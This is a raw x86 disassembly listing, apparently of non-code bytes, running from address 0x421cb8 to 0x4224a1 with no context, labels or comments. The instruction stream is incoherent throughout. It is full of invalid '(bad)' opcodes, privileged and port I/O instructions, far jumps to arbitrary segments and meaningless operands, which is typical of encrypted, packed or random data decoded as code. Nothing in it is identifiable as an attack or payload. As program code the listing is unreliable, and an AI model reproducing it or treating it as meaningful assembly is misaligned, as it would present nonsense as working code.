  421cb8:	jnp    0x421c92
  421cba:	test   al,0xa0
  421cbc:	or     DWORD PTR [esi-0x3fb99223],0xfffffff6
  421cc3:	inc    edi
  421cc4:	add    ebp,0xffffffb8
  421cc7:	jnp    0x421d2f
  421cc9:	push   edx
  421cca:	mov    dh,0x26
  421ccc:	ret    0xd8de
  421ccf:	in     eax,0x30
  421cd1:	dec    esi
  421cd2:	mov    edi,0x9369d2c0
  421cd7:	loope  0x421d52
  421cd9:	pop    eax
  421cda:	sub    bl,0xfa
  421cdd:	cmp    eax,0x5214feb1
  421ce2:	je     0x421c9b
  421ce4:	lods   eax,DWORD PTR ds:[esi]
  421ce5:	jb     0x421caa
  421ce7:	inc    esi
  421ce8:	loopne 0x421ccf
  421cea:	jl     0x421cf0
  421cec:	repz jne 0x421cd7
  421cef:	or     ecx,eax
  421cf1:	fs (bad) 
  421cf3:	(bad)  
  421cf4:	adc    eax,0xd51f610e
  421cf9:	(bad)  
  421cfa:	pop    eax
  421cfb:	or     BYTE PTR [ebp-0x7c],bl
  421cfe:	inc    eax
  421cff:	pop    ecx
  421d00:	sub    al,dh
  421d02:	push   eax
  421d03:	adc    ebp,DWORD PTR [edx]
  421d05:	xor    al,0x3b
  421d07:	pop    ss
  421d08:	int3   
  421d09:	cmp    eax,0x151e4f3f
  421d0e:	fcomp  QWORD PTR [si]
  421d11:	inc    esp
  421d12:	xchg   ecx,eax
  421d13:	and    al,0x6b
  421d15:	xchg   esi,eax
  421d16:	ffreep st(7)
  421d18:	fidiv  DWORD PTR [edi]
  421d1a:	fstp   TBYTE PTR [edx+0x5b3d8f53]
  421d20:	call   0x27ec:0xf87f1d3f
  421d27:	mov    ah,0x1f
  421d29:	shr    DWORD PTR [ebx+0x7a0fbb45],cl
  421d2f:	loope  0x421d43
  421d31:	leave  
  421d32:	cmp    eax,0x71f75e2
  421d37:	jecxz  0x421cf6
  421d39:	iret   
  421d3a:	dec    esp
  421d3b:	and    DWORD PTR [ebp+0x5b1116eb],ebx
  421d41:	and    ecx,DWORD PTR [ebx-0x2868c172]
  421d47:	xchg   edi,eax
  421d48:	sar    DWORD PTR [esi],1
  421d4a:	sbb    al,0x7c
  421d4c:	je     0x421cfa
  421d4e:	dec    ebp
  421d4f:	daa    
  421d50:	push   ss
  421d51:	daa    
  421d52:	add    DWORD PTR [ebx+0x4d12e8e7],edx
  421d58:	push   edx
  421d59:	mov    ds:0x5b78950a,al
  421d5e:	sub    ah,bh
  421d60:	adc    BYTE PTR fs:[edx+0x42],al
  421d64:	je     0x421d7b
  421d66:	or     al,0x4
  421d68:	xor    ecx,edi
  421d6a:	xor    BYTE PTR [edi],0x3a
  421d6d:	jbe    0x421da8
  421d6f:	mov    es,WORD PTR [ebp+0x6c]
  421d72:	or     DWORD PTR [ebx-0x703534f6],ebp
  421d78:	mov    BYTE PTR [ecx+ebp*4+0x61],al
  421d7c:	or     esp,DWORD PTR [ecx-0x46b4937f]
  421d82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d83:	repz dec esp
  421d85:	pop    ebp
  421d86:	ror    BYTE PTR [ebx-0x6],0x6
  421d8a:	shr    DWORD PTR [ebx],1
  421d8c:	mov    eax,ds:0xae210be0
  421d91:	dec    ecx
  421d92:	lods   al,BYTE PTR ds:[esi]
  421d93:	sub    ch,0xaa
  421d96:	or     bl,BYTE PTR [ecx-0x51194f98]
  421d9c:	xor    BYTE PTR [ebx+0x3b],0x53
  421da0:	cli    
  421da1:	or     edi,DWORD PTR [ebx+0x4311a2a4]
  421da7:	scas   eax,DWORD PTR es:[edi]
  421da8:	imul   edx,DWORD PTR [edi-0x28c69159],0xb0cf7720
  421db2:	ror    edx,cl
  421db4:	(bad)  
  421db5:	imul   BYTE PTR [ebx+0x30]
  421db8:	imul   esp,DWORD PTR [edx+0x5c],0xb0883464
  421dbf:	jo     0x421d83
  421dc1:	test   BYTE PTR [ecx+0xca162d2],dh
  421dc7:	inc    esp
  421dc8:	xchg   esp,eax
  421dc9:	mov    dh,0x22
  421dcb:	enter  0x990a,0xae
  421dcf:	call   0xbdd7:0x2b95e5bf
  421dd6:	sahf   
  421dd7:	mov    bl,0xd3
  421dd9:	and    eax,0xb21bdb66
  421dde:	or     DWORD PTR [edi],edi
  421de0:	fstp   TBYTE PTR [eax-0x27]
  421de3:	pop    esi
  421de4:	jle    0x421ded
  421de6:	inc    edx
  421de7:	sub    edi,DWORD PTR [ecx]
  421de9:	ror    BYTE PTR [eax],1
  421deb:	jmp    0x2abe8447
  421df0:	mov    ebx,0x897c400d
  421df5:	jl     0x421e39
  421df7:	js     0x421db3
  421df9:	jl     0x421e76
  421dfb:	mov    cl,0xce
  421dfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421dfe:	fbld   TBYTE PTR [ebx-0x5a]
  421e01:	fild   DWORD PTR [edx+0x18]
  421e04:	adc    dl,BYTE PTR [ebp+edx*2-0x1cdd4b6]
  421e0b:	mov    dl,0xa
  421e0d:	test   BYTE PTR [edi-0x1a],cl
  421e10:	sbb    eax,0x947d6216
  421e15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e16:	hlt    
  421e17:	adc    DWORD PTR [edx-0x5f],0xa8be9799
  421e1e:	lock pop ds
  421e20:	mov    dl,0xd5
  421e22:	sbb    eax,0xa0949e78
  421e27:	leave  
  421e28:	push   ds
  421e29:	cmp    cl,ch
  421e2b:	fs xchg esp,eax
  421e2d:	jg     0x421e19
  421e2f:	push   ds
  421e30:	fcom   QWORD PTR [eax+ecx*8+0x56]
  421e34:	sbb    edi,DWORD PTR [edx+eiz*8]
  421e37:	loopne 0x421e01
  421e39:	or     esi,DWORD PTR [ebx-0x1d573d2d]
  421e3f:	jl     0x421e7b
  421e41:	retf   
  421e42:	and    eax,0x80cb5937
  421e47:	xchg   esi,eax
  421e48:	in     eax,0xe9
  421e4a:	iret   
  421e4b:	jmp    0x4734:0xbf2c70d2
  421e52:	ftst   
  421e54:	pop    ecx
  421e55:	ficom  WORD PTR [ebp+0xf0ac2e4]
  421e5b:	xchg   esi,eax
  421e5c:	inc    esp
  421e5d:	xor    al,BYTE PTR [ecx-0x323db5bf]
  421e63:	mov    eax,ds:0x56bc64ba
  421e68:	retf   
  421e69:	sqrtps xmm6,XMMWORD PTR ds:0xb7991a92
  421e70:	jp     0x421e16
  421e72:	xor    ebp,DWORD PTR gs:0xe797fad1
  421e79:	mov    esp,0x5879db58
  421e7e:	jmp    0x421e53
  421e80:	pushf  
  421e81:	bound  ebx,QWORD PTR [ebx+0xb7a835d]
  421e87:	nop
  421e88:	jne    0x421e30
  421e8a:	inc    esp
  421e8b:	leave  
  421e8c:	es fcmovbe st,st(2)
  421e8f:	mov    al,0x35
  421e91:	out    dx,eax
  421e92:	pop    ds
  421e93:	jge    0x421e76
  421e95:	push   esi
  421e96:	jo     0x421e1e
  421e98:	pushf  
  421e99:	fwait
  421e9a:	adc    al,BYTE PTR es:[esp+ebp*2-0x25ec19d]
  421ea2:	push   ebp
  421ea3:	ss jge 0x421e69
  421ea6:	pop    esp
  421ea7:	push   cs
  421ea8:	scas   al,BYTE PTR es:[edi]
  421ea9:	mov    cl,0xc9
  421eab:	je     0x421e71
  421ead:	data16 sti 
  421eaf:	clc    
  421eb0:	pop    ebx
  421eb1:	std    
  421eb2:	jecxz  0x421ecd
  421eb4:	(bad)  
  421eb5:	push   0xffffffa0
  421eb7:	mov    edx,0x84051425
  421ebc:	jmp    DWORD PTR [eax-0x2ffaab71]
  421ec2:	in     eax,dx
  421ec3:	sbb    ebp,DWORD PTR [ebp+0x77]
  421ec6:	push   es
  421ec7:	xrelease mov DWORD PTR [ecx+0x7825cb9c],edi
  421ece:	outs   dx,BYTE PTR ds:[esi]
  421ecf:	mov    esi,0x12986928
  421ed4:	adc    BYTE PTR [ebx-0x7170ebb2],dh
  421eda:	in     eax,dx
  421edb:	add    DWORD PTR [ebx],ebp
  421edd:	pop    edx
  421ede:	dec    ebx
  421edf:	push   0xffffffe8
  421ee1:	imul   edi,DWORD PTR [eax+0x10ba7673],0xffffff98
  421ee8:	inc    eax
  421ee9:	jl     0x421f53
  421eeb:	es inc edi
  421eed:	pop    ds
  421eee:	cdq    
  421eef:	icebp  
  421ef0:	and    ebx,0xffffff9e
  421ef3:	mov    dh,0xfc
  421ef5:	or     eax,ecx
  421ef7:	out    dx,eax
  421ef8:	mov    edx,0x87dfce3e
  421efd:	xor    al,0x2c
  421eff:	cmp    al,0xcc
  421f01:	inc    ecx
  421f02:	push   eax
  421f03:	and    al,0xaa
  421f05:	push   edx
  421f06:	loop   0x421ec1
  421f08:	test   DWORD PTR [edi+0xf],ecx
  421f0b:	arpl   WORD PTR [esi+0x1b],dx
  421f0e:	stos   DWORD PTR es:[edi],eax
  421f0f:	or     al,0xa0
  421f11:	add    bh,BYTE PTR ds:0xe4ab0542
  421f17:	in     eax,0x84
  421f19:	jecxz  0x421f0b
  421f1b:	push   ebp
  421f1c:	sub    al,0x63
  421f1e:	sub    bl,al
  421f20:	mov    al,0xbb
  421f22:	les    esp,FWORD PTR [eax]
  421f24:	pop    ebp
  421f25:	cmp    DWORD PTR [eax],0xffffff91
  421f28:	pop    edx
  421f29:	mov    eax,ds:0xad7ad4ba
  421f2e:	pop    esp
  421f2f:	and    DWORD PTR [edi+0x3a],0xffffffcf
  421f33:	ins    BYTE PTR es:[edi],dx
  421f34:	scas   al,BYTE PTR es:[edi]
  421f35:	mov    al,ds:0x902298d
  421f3a:	rcl    DWORD PTR [esi+0x15091131],1
  421f40:	adc    al,0x10
  421f42:	pop    ds
  421f43:	aaa    
  421f44:	das    
  421f45:	ins    DWORD PTR es:[edi],dx
  421f46:	cmp    DWORD PTR [edi],eax
  421f48:	pop    edi
  421f49:	push   esp
  421f4a:	sahf   
  421f4b:	repz out 0x41,al
  421f4e:	out    dx,eax
  421f4f:	and    BYTE PTR [ecx+eiz*8+0x1a],cl
  421f53:	adc    BYTE PTR [esi],ah
  421f55:	inc    ebp
  421f56:	repnz pop ebx
  421f58:	pushf  
  421f59:	enter  0x837a,0x5
  421f5d:	or     BYTE PTR [edi],al
  421f5f:	xor    ecx,DWORD PTR [eax+esi*2]
  421f62:	(bad)  
  421f64:	test   bl,al
  421f66:	push   eax
  421f67:	stos   BYTE PTR es:[edi],al
  421f68:	sbb    edi,edi
  421f6a:	sbb    DWORD PTR [ecx+0xcc6f5ad],ebp
  421f70:	mov    bl,0x1a
  421f72:	and    BYTE PTR [edi-0x20],al
  421f75:	pop    eax
  421f76:	das    
  421f77:	sbb    al,0xbc
  421f79:	mov    esp,0x7d1e917e
  421f7e:	cmp    al,0x4b
  421f80:	or     DWORD PTR [ebp-0x5f],eax
  421f83:	ds loop 0x421f3d
  421f86:	push   esi
  421f87:	stos   DWORD PTR es:[edi],eax
  421f88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f89:	out    dx,eax
  421f8a:	cwde   
  421f8b:	xlat   BYTE PTR ds:[ebx]
  421f8c:	fld    QWORD PTR [ebp+0x34149708]
  421f92:	sub    dl,al
  421f94:	fdiv   QWORD PTR [eax+0x698ed3d7]
  421f9a:	fld    DWORD PTR [eax]
  421f9c:	mov    bh,0x21
  421f9e:	out    dx,al
  421f9f:	jno    0x421fd8
  421fa1:	out    dx,al
  421fa2:	aad    0x8c
  421fa4:	lods   eax,DWORD PTR ds:[esi]
  421fa5:	rol    esi,0x89
  421fa8:	and    BYTE PTR [eax],bl
  421faa:	mov    esi,DWORD PTR [eax]
  421fac:	sbb    al,0xf1
  421fae:	mov    ch,0xfa
  421fb0:	popf   
  421fb1:	lock jge 0x421fd8
  421fb4:	jmp    0x549c:0xa6cfdd5f
  421fbb:	jne    0x421fdb
  421fbd:	pop    ss
  421fbe:	call   0x26ea:0xc87e4841
  421fc5:	std    
  421fc6:	in     eax,0x81
  421fc8:	xor    dh,BYTE PTR [ecx-0x79f47753]
  421fce:	dec    eax
  421fcf:	js     0x421fcd
  421fd1:	pop    esi
  421fd2:	lock inc edi
  421fd4:	lea    esi,[ebp+0x2cf2b2fb]
  421fda:	mov    DWORD PTR [esi],ebx
  421fdc:	pop    edx
  421fdd:	(bad)  
  421fde:	out    dx,al
  421fdf:	and    bl,dl
  421fe1:	cmp    ch,BYTE PTR [edi+0x4e52fe65]
  421fe7:	shl    ecx,0x49
  421fea:	icebp  
  421feb:	add    ah,BYTE PTR [edx-0x358cf5f3]
  421ff1:	in     al,dx
  421ff2:	sub    cl,dl
  421ff4:	jb     0x421ffb
  421ff6:	pop    ebx
  421ff7:	mulps  xmm4,XMMWORD PTR [ebx+0x3e]
  421ffb:	inc    esp
  421ffc:	mov    ebp,0xe95a08a5
  422001:	mov    al,0x55
  422003:	add    eax,0x1bdbf6cb
  422008:	inc    esp
  422009:	sti    
  42200a:	xchg   esi,eax
  42200b:	stos   BYTE PTR es:[edi],al
  42200c:	push   ds
  42200d:	push   esp
  42200e:	sub    BYTE PTR [esi+0x58],0xac
  422012:	(bad)  [eax+0x22adc1e5]
  422018:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422019:	shr    ecx,cl
  42201b:	mov    edx,0x27d908b2
  422020:	lods   eax,DWORD PTR ds:[esi]
  422021:	inc    ebx
  422022:	cdq    
  422023:	enter  0x8c96,0x3d
  422027:	push   DWORD PTR [edi-0x4d]
  42202a:	call   0xead4507d
  42202f:	shl    al,0x4a
  422032:	sbb    BYTE PTR [edi],bl
  422034:	jmp    0x56aa:0x9fb2fa94
  42203b:	jmp    0xead6:0x316b5706
  422042:	and    eax,edi
  422044:	and    dl,bh
  422046:	sahf   
  422047:	jle    0x422052
  422049:	dec    edx
  42204a:	fst    DWORD PTR [ebp+0x6d]
  42204d:	sbb    DWORD PTR [esp+ebx*8-0x4],ecx
  422051:	js     0x422097
  422053:	clc    
  422054:	lea    esp,[ebx+ebx*1]
  422057:	mov    ecx,0x2dfdc2b0
  42205c:	test   BYTE PTR [edi+ebp*2+0x3c],dh
  422060:	je     0x421ffc
  422062:	dec    ecx
  422063:	adc    edx,0xe030a159
  422069:	lods   al,BYTE PTR ds:[esi]
  42206a:	ss push ebp
  42206c:	pop    edi
  42206d:	and    BYTE PTR [ebx-0x34],0xef
  422071:	mov    ds:0x3e9de775,al
  422076:	dec    edx
  422077:	out    0x51,eax
  422079:	jge    0x4220e8
  42207b:	fidiv  WORD PTR [eax]
  42207d:	aas    
  42207e:	jmp    0x3608c72d
  422083:	pop    DWORD PTR [eax+0x53]
  422086:	add    edi,DWORD PTR [ecx-0x4eb9b4b9]
  42208c:	stos   DWORD PTR es:[edi],eax
  42208d:	pop    es
  42208e:	dec    esp
  422090:	or     DWORD PTR [edi-0x4f],0xffffffb2
  422094:	mov    bh,0x2a
  422096:	jns    0x42206e
  422098:	hlt    
  422099:	in     al,0xa
  42209b:	pop    ss
  42209c:	sahf   
  42209d:	mov    ch,0x0
  42209f:	pusha  
  4220a0:	fdiv   DWORD PTR [edx+0x508f6de9]
  4220a6:	push   es
  4220a7:	jl     0x422037
  4220a9:	or     ebp,DWORD PTR [ecx]
  4220ab:	popa   
  4220ac:	dec    ebp
  4220ad:	das    
  4220ae:	jo     0x42206c
  4220b0:	nop
  4220b1:	daa    
  4220b2:	dec    ebx
  4220b3:	adc    BYTE PTR [ecx-0x1fbcd42b],0xab
  4220ba:	jnp    0x4220c9
  4220bc:	push   ecx
  4220bd:	popf   
  4220be:	loope  0x42208f
  4220c0:	dec    edx
  4220c1:	in     al,dx
  4220c2:	test   DWORD PTR [esi+ebx*4+0x5ebf0b02],edx
  4220c9:	cli    
  4220ca:	mov    ?,WORD PTR [ebx]
  4220cc:	jo     0x42208e
  4220ce:	pop    edi
  4220cf:	dec    ebp
  4220d0:	fnstsw WORD PTR [edi]
  4220d2:	repz call 0x2cb3:0xf4f79674
  4220da:	add    bh,BYTE PTR [esi+edi*4]
  4220dd:	fwait
  4220de:	pop    ebx
  4220df:	xchg   DWORD PTR [ebx+0x6344433c],edx
  4220e5:	dec    esp
  4220e6:	in     al,0x9d
  4220e8:	jle    0x422076
  4220ea:	outs   dx,BYTE PTR ds:[esi]
  4220eb:	(bad)  
  4220ec:	sub    eax,0xb7bf0326
  4220f1:	fist   DWORD PTR [ecx]
  4220f3:	sub    dh,BYTE PTR [eax-0x77]
  4220f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4220f7:	sub    eax,ecx
  4220f9:	or     BYTE PTR [eax],0x4c
  4220fc:	pop    ds
  4220fd:	xlat   BYTE PTR ds:[ebx]
  4220fe:	test   BYTE PTR [edx],0xa3
  422101:	dec    esi
  422102:	dec    ebp
  422103:	das    
  422104:	lods   al,BYTE PTR ds:[esi]
  422105:	dec    DWORD PTR [ebx-0x53]
  422108:	cdq    
  422109:	jae    0x4220f7
  42210b:	inc    ebp
  42210c:	push   esi
  42210d:	les    edx,FWORD PTR [esp-0x22f2886e]
  422114:	hlt    
  422115:	cmp    DWORD PTR [ebp-0x7f],edi
  422118:	int    0x7
  42211a:	cld    
  42211b:	dec    edi
  42211c:	push   0xfffffff6
  42211e:	in     eax,dx
  42211f:	inc    esp
  422120:	cmp    DWORD PTR [edx+0x55],0xffffffea
  422124:	sub    dh,ah
  422126:	syscall 
  422128:	xchg   ebx,eax
  422129:	push   ebp
  42212a:	lds    edx,FWORD PTR [edx+0x16684d0f]
  422130:	jmp    0x21c8f875
  422135:	adc    al,0x4b
  422137:	stos   DWORD PTR es:[edi],eax
  422138:	sub    DWORD PTR [edx],edx
  42213a:	int    0x24
  42213c:	inc    DWORD PTR [ebx+0x2ae6fba3]
  422142:	mov    ebp,0x18f633f5
  422147:	ins    DWORD PTR es:[edi],dx
  422148:	adc    eax,0x2eb5a820
  42214d:	and    eax,0x4686f01d
  422152:	mov    eax,ds:0x6839c868
  422157:	add    eax,DWORD PTR [ebx-0x7a]
  42215a:	or     dl,BYTE PTR [edx]
  42215c:	xchg   esi,eax
  42215d:	mov    edx,0x1416dcfc
  422162:	fsub   QWORD PTR [edx-0x6e]
  422165:	xor    dl,BYTE PTR [ebp-0x790176d7]
  42216b:	jae    0x422137
  42216d:	push   0x67
  42216f:	shl    DWORD PTR gs:[ecx-0x4c],cl
  422173:	dec    edi
  422174:	pop    ds
  422175:	ror    al,0xda
  422178:	inc    edi
  422179:	push   ebx
  42217a:	sbb    BYTE PTR [eax-0x4d],bh
  42217d:	scas   eax,DWORD PTR es:[edi]
  42217e:	mov    cl,0x4a
  422180:	popf   
  422181:	push   ebp
  422182:	pusha  
  422183:	dec    eax
  422184:	xor    al,0x44
  422186:	cmp    BYTE PTR [edx-0x4d7ac37a],ch
  42218c:	jl     0x422147
  42218e:	cwde   
  42218f:	xchg   ebx,eax
  422190:	test   BYTE PTR [ebx],al
  422192:	mov    ebp,0x407b3493
  422197:	and    ch,ah
  422199:	arpl   WORD PTR [edi-0x70aade0],cx
  42219f:	jmp    0xcc8b:0xd2df4c4
  4221a6:	dec    ebx
  4221a7:	(bad)  
  4221a8:	loopne 0x422157
  4221aa:	xchg   ebp,eax
  4221ab:	jno    0x422153
  4221ad:	push   esp
  4221ae:	jnp    0x42217f
  4221b0:	xchg   ebp,eax
  4221b1:	and    BYTE PTR [edx-0x36fe9a8c],0x8f
  4221b8:	or     eax,0x6a4b2b3c
  4221bd:	jbe    0x422179
  4221bf:	into   
  4221c0:	xchg   DWORD PTR [ebp+0x9],esp
  4221c3:	inc    ecx
  4221c4:	jb     0x4221c6
  4221c6:	cmp    eax,DWORD PTR [esi-0x4eb7059e]
  4221cc:	adc    DWORD PTR [ebx-0x43],esi
  4221cf:	jbe    0x4221bd
  4221d1:	push   0xffffffb0
  4221d3:	jae    0x422188
  4221d5:	outs   dx,BYTE PTR ds:[esi]
  4221d6:	repnz adc eax,0xaede6766
  4221dc:	and    BYTE PTR [edi-0x76],0xfd
  4221e0:	daa    
  4221e1:	call   0x1b82:0x187f2663
  4221e8:	test   eax,0x3e7c3f69
  4221ed:	push   ds
  4221ee:	add    BYTE PTR [ebx],al
  4221f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4221f1:	push   cs
  4221f2:	in     al,0xab
  4221f4:	sbb    BYTE PTR ds:0xa2dd9fab,dl
  4221fa:	dec    edx
  4221fb:	push   ds
  4221fc:	pminsw mm0,QWORD PTR [edx-0x72ae83e4]
  422203:	pop    ds
  422204:	mov    WORD PTR [ecx],?
  422206:	(bad)  
  422207:	cmp    eax,0x297d3090
  42220c:	mov    WORD PTR [eax],ss
  42220e:	mov    ebx,DWORD PTR [edi-0x63]
  422211:	mov    al,ds:0x67cb602e
  422216:	int    0xe1
  422218:	xchg   ebp,eax
  422219:	ds push ecx
  42221b:	dec    edx
  42221c:	jg     0x4221c1
  42221e:	push   cs
  42221f:	das    
  422220:	(bad)  
  422221:	rcr    DWORD PTR ds:0xcf276d26,0xc9
  422228:	cmp    cl,ah
  42222a:	xor    eax,0x24888526
  42222f:	out    dx,eax
  422230:	xor    ecx,edx
  422232:	cmc    
  422233:	and    DWORD PTR [ecx-0x73],ecx
  422236:	das    
  422237:	inc    ebx
  422238:	jp     0x42222e
  42223a:	push   edx
  42223b:	mov    ds:0x892a52c1,eax
  422240:	mov    esi,0xbe2e7c5b
  422245:	push   esi
  422246:	ins    DWORD PTR es:[edi],dx
  422247:	jecxz  0x42220c
  422249:	add    bh,ah
  42224b:	xchg   edx,eax
  42224c:	push   0x5a0cab03
  422251:	loope  0x422282
  422253:	cwde   
  422254:	push   es
  422255:	mov    esp,0x57ec22a
  42225a:	lods   al,BYTE PTR ds:[esi]
  42225b:	ins    DWORD PTR es:[edi],dx
  42225c:	mov    ebp,0xa9a7e8ab
  422261:	or     eax,ebp
  422263:	(bad)  [eax+0x42cdcd12]
  422269:	mov    edi,0xfece975a
  42226e:	icebp  
  42226f:	sub    BYTE PTR [esi+edx*4-0x5a],dh
  422273:	ret    
  422274:	jae    0x4222eb
  422276:	enter  0x6e62,0xe8
  42227a:	repz cmp eax,0x9f93b75
  422280:	fnstcw WORD PTR [ecx-0x6d03f33e]
  422286:	mov    dh,0xce
  422288:	inc    eax
  422289:	iret   
  42228a:	xchg   esi,eax
  42228b:	das    
  42228c:	mov    edx,0x2f15bfe3
  422291:	pop    DWORD PTR [edi+0x6946c01f]
  422297:	cmp    eax,0x2e3459ee
  42229c:	mov    dl,0xbc
  42229e:	xchg   ecx,eax
  42229f:	fiadd  WORD PTR [ebx+ebp*8]
  4222a2:	mov    dh,0x79
  4222a4:	sbb    bl,dh
  4222a6:	in     eax,0xdd
  4222a8:	add    DWORD PTR [esi-0x44c5f767],edi
  4222ae:	sbb    eax,0xdd6a61b8
  4222b3:	mov    al,ds:0x3a2d184a
  4222b8:	sti    
  4222b9:	inc    esp
  4222ba:	ja     0x4222bc
  4222bc:	mov    esi,0x206cb4aa
  4222c1:	ja     0x42231f
  4222c3:	mov    ch,0xb9
  4222c5:	iret   
  4222c6:	hlt    
  4222c7:	leave  
  4222c8:	nop
  4222c9:	sbb    bl,BYTE PTR [edi+0x1f]
  4222cc:	rcl    BYTE PTR [esi+0x60],0x92
  4222d0:	pop    edi
  4222d1:	out    0x4e,eax
  4222d3:	ret    
  4222d4:	stos   BYTE PTR es:[edi],al
  4222d5:	adc    ecx,DWORD PTR [ebp-0x60fb54da]
  4222db:	or     esi,esp
  4222dd:	xchg   ebx,eax
  4222de:	inc    ecx
  4222df:	sbb    DWORD PTR [esi+eax*4+0x16],0x3a2e287c
  4222e7:	push   ds
  4222e8:	retf   
  4222e9:	push   esi
  4222ea:	daa    
  4222eb:	cld    
  4222ec:	add    ebx,DWORD PTR [edi+0x186697e3]
  4222f2:	mov    edi,0x6af13b57
  4222f7:	sub    BYTE PTR es:[ebx-0x64dff902],bh
  4222fe:	enter  0xe00a,0x24
  422302:	out    0x51,eax
  422304:	xchg   esp,eax
  422305:	or     al,0x3d
  422307:	mov    ds:0x9d55fad9,al
  42230c:	cld    
  42230d:	pop    ds
  42230e:	add    dl,BYTE PTR [edi]
  422310:	adc    eax,0xe2ee196c
  422315:	test   BYTE PTR [edi-0x18],dh
  422318:	and    eax,0xa90a36bc
  42231d:	(bad)  
  42231e:	jmp    0x422394
  422320:	push   es
  422321:	push   ss
  422322:	cld    
  422323:	and    esp,edx
  422325:	test   BYTE PTR [ebx+0x18],cl
  422328:	pop    esp
  422329:	imul   esp,DWORD PTR [ebp+edi*2-0x16f8dafa],0x2860b99
  422334:	mov    DWORD PTR [ebx+0xd133ec],0x2ef6c226
  42233e:	stos   DWORD PTR es:[edi],eax
  42233f:	popf   
  422340:	and    DWORD PTR [esi+0x37],edi
  422343:	dec    ebx
  422344:	cld    
  422345:	scas   eax,DWORD PTR es:[edi]
  422346:	fwait
  422347:	outs   dx,BYTE PTR ds:[esi]
  422348:	cmp    al,0xb9
  42234a:	addr16 cmc 
  42234c:	mov    ebp,0x6b6c628a
  422351:	mov    ds:0x8cb6d7af,al
  422356:	jecxz  0x422308
  422358:	stos   DWORD PTR es:[edi],eax
  422359:	pop    ss
  42235a:	or     al,0x5e
  42235c:	push   es
  42235d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42235e:	push   0xffffffbc
  422360:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422361:	fcomi  st,st(7)
  422363:	shl    edx,1
  422365:	rcr    BYTE PTR [ebx],0xc1
  422368:	in     eax,0x17
  42236a:	popf   
  42236b:	mov    ebp,0x1923a40d
  422370:	out    0x29,al
  422372:	mov    DWORD PTR [edi+0x336d0841],edx
  422378:	xor    ebp,DWORD PTR [esi+ebp*8+0x65]
  42237c:	repz xor BYTE PTR [edx+0xe],ah
  422380:	inc    ecx
  422381:	inc    ecx
  422382:	loop   0x422357
  422384:	mov    cl,0xa
  422386:	ds jno 0x4223bb
  422389:	xor    eax,0xb5f89a43
  42238e:	(bad)  
  42238f:	fmul   DWORD PTR [edi-0x3eb3c90]
  422395:	mov    es,WORD PTR [edi+0x6a]
  422398:	outs   dx,DWORD PTR ds:[esi]
  422399:	sahf   
  42239a:	nop
  42239b:	ins    DWORD PTR es:[di],dx
  42239d:	mov    cl,al
  42239f:	mov    edi,0x4309a88f
  4223a4:	pop    ds
  4223a5:	(bad)  
  4223a6:	xor    DWORD PTR [eax-0x72a2600a],ecx
  4223ac:	pop    ebp
  4223ad:	sbb    esp,DWORD PTR [ebx-0x44]
  4223b0:	inc    edx
  4223b1:	xchg   DWORD PTR [ebp+0x592e65f7],ecx
  4223b7:	pop    ebp
  4223b8:	ins    BYTE PTR es:[edi],dx
  4223b9:	mov    ah,0xe3
  4223bb:	mov    ah,0x71
  4223bd:	jno    0x4223f0
  4223bf:	mov    ebp,0x64de7588
  4223c4:	add    esp,DWORD PTR [esi]
  4223c6:	repz mov ss,esp
  4223c9:	aaa    
  4223ca:	ja     0x422395
  4223cc:	xchg   ecx,eax
  4223cd:	and    BYTE PTR [ecx+0x7b],dl
  4223d0:	mov    eax,ds:0xbd488587
  4223d5:	pop    esi
  4223d6:	xor    esp,DWORD PTR ds:0xa1105205
  4223dc:	mov    al,0x62
  4223de:	es dec eax
  4223e0:	and    eax,0xd7b192d6
  4223e5:	mov    ds:0x2fd337ff,eax
  4223ea:	hlt    
  4223eb:	dec    edx
  4223ec:	int    0x80
  4223ee:	pop    ebp
  4223ef:	mov    ecx,0x8e0c80e
  4223f4:	cmp    bh,cl
  4223f6:	and    dl,BYTE PTR [ecx-0x17]
  4223f9:	xor    DWORD PTR [ecx+ebp*4+0x774fddef],ebx
  422400:	pop    ecx
  422401:	data16 mov ah,0x13
  422404:	lahf   
  422405:	adc    ebp,DWORD PTR ss:[esi-0x34436c09]
  42240c:	out    dx,al
  42240d:	aaa    
  42240e:	imul   esi,DWORD PTR [ecx],0xa4b19d9c
  422414:	stos   DWORD PTR es:[edi],eax
  422415:	mov    WORD PTR [eax-0x2e25ebbf],ds
  42241b:	call   0xc4fdee6
  422420:	xchg   DWORD PTR [eax+0x47],esp
  422423:	aas    
  422424:	push   edi
  422425:	test   BYTE PTR [ebx],0x8c
  422428:	mov    ah,0xeb
  42242a:	xchg   edi,eax
  42242b:	dec    ecx
  42242c:	stos   BYTE PTR es:[edi],al
  42242d:	cmp    DWORD PTR [ebx-0x6728f832],eax
  422433:	dec    ebx
  422434:	xor    eax,0xf537f04b
  422439:	inc    esp
  42243a:	fs dec edx
  42243c:	sar    BYTE PTR [ebp-0x4332bd4b],cl
  422442:	push   ecx
  422443:	xor    al,0x1c
  422445:	add    al,0xcd
  422447:	push   ecx
  422448:	ss push ebp
  42244a:	cmp    cl,bh
  42244c:	push   es
  42244d:	push   es
  42244e:	addr16 pop edx
  422450:	mov    ch,0x23
  422452:	inc    DWORD PTR [ebx-0x34]
  422455:	push   esi
  422456:	sub    ebx,DWORD PTR [ebp+edx*4-0x1a6ea8ec]
  42245d:	adc    DWORD PTR [ebx+0x58],0xbae14a7b
  422464:	jbe    0x422479
  422466:	push   edi
  422467:	ja     0x422443
  422469:	or     al,0x55
  42246b:	shl    DWORD PTR [eax-0x7d21fea1],1
  422471:	lock xchg ebp,eax
  422473:	sti    
  422474:	mov    ecx,0x9241754a
  422479:	xor    al,0xac
  42247b:	aad    0x1a
  42247d:	mov    ecx,0xb753f447
  422482:	sbb    esi,ebp
  422484:	dec    eax
  422485:	retf   0x83e2
  422488:	and    bl,dh
  42248a:	or     edx,edx
  42248c:	lea    ebp,ds:0x6c1bd7aa
  422492:	cli    
  422493:	lock dec ebx
  422495:	sub    al,ch
  422497:	mov    ebp,0xea0de5e5
  42249c:	mov    ds:0x69bc9809,al
  4224a1:	push   ecx
